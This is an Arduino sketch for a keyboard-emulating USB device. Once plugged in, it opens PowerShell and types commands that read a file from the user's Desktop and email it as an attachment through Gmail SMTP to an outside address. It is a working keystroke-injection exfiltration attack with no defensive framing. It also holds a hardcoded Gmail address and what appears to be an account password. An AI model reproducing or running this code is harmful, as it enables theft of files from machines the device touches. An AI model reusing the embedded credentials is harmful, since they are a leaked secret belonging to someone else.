#include <Keyboard.h>
#include <stdlib.h>

void setup() {
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println("powershell");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.println("$Username = 'xpharoh1@gmail.com'");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("$Password = 'wypuwcjskmqelujk'");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("$EmailFrom = 'xpharoh1@gmail.com'");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("$EmailTo = 'xpharoh@gmail.com'");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("$Subject = 'URGENT-MSG'");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("$Body = 'PLEASE CHECK THE ATTACHED FILE'");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("$SMTPServer = 'smtp.gmail.com'");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("$SMTPPort = 587");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("$Attachment = 'C:\\Users\\Xphar\\Desktop\\galorgvur.txt'");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("$SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, $SMTPPort)");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("$SMTPClient.EnableSsl = $true");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("$Message = New-Object System.Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, $Body)");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("$AttachmentData = [System.IO.File]::ReadAllBytes($Attachment)");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("$AttachmentBase64 = [System.Convert]::ToBase64String($AttachmentData)");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("$AttachmentStream = [System.IO.MemoryStream]::new([System.Convert]::FromBase64String($AttachmentBase64))");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("$Attachment = New-Object System.Net.Mail.Attachment($AttachmentStream, 'galorgvur.txt', 'application/octet-stream')");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("$Message.Attachments.Add($Attachment)");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("$SMTPClient.Send($Message)");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
}

void loop() {
  // Empty loop
}
